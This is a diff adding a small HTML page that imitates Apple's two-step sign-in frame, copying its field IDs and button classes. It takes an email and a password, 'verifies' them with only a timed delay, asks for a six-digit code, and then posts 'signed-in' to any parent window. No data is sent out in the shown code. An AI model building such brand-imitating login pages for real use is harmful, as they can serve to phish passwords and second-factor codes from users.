@@ -1,0 +1,33 @@
+<!doctype html><title>Hosted sign-in frame</title>
+<style>.hide{display:none}</style>
+<div id="app">
+  <div id="creds">
+    <label id="apple_id_label">Email</label>
+    <input type="text" id="account_name_text_field" enterkeyhint="done" autocorrect="off" autocapitalize="off" required spellcheck="false" autocomplete="username webauthn">
+    <div id="pwbox" class="hide">
+      <input type="password" id="password_text_field" required autocomplete="current-password" tabindex="-1">
+    </div>
+    <label><input type="checkbox" id="remember-me"> Keep me signed in</label>
+    <button id="sign-in" class="button button-rounded-rectangle signin-v2__button">Continue</button>
+  </div>
+</div>
+<script>
+  const q = new URLSearchParams(location.search);
+  const email = document.getElementById('account_name_text_field');
+  const pwbox = document.getElementById('pwbox');
+  const button = document.getElementById('sign-in');
+  button.addEventListener('click', () => {
+    if (pwbox.classList.contains('hide')) {              // step one: email, then reveal the password
+      pwbox.classList.remove('hide'); button.textContent = 'Sign in'; return;
+    }
+    // step two: "verify" the password, then ask for a verification code in the same frame
+    setTimeout(() => {
+      if (q.get('mode') === 'stay') {
+        document.getElementById('app').insertAdjacentHTML('beforeend', '<div id="code"><p>Enter the code</p><input type="tel" id="code1" maxlength="6"><button id="code-go">Verify</button></div>');
+      } else {
+        document.getElementById('app').innerHTML = '<div id="code"><p>Enter the code</p><input type="tel" id="code1" maxlength="6"><button id="code-go">Verify</button></div>';
+      }
+      document.getElementById('code-go').onclick = () => parent.postMessage('signed-in', '*');
+    }, 1200);
+  });
+</script>
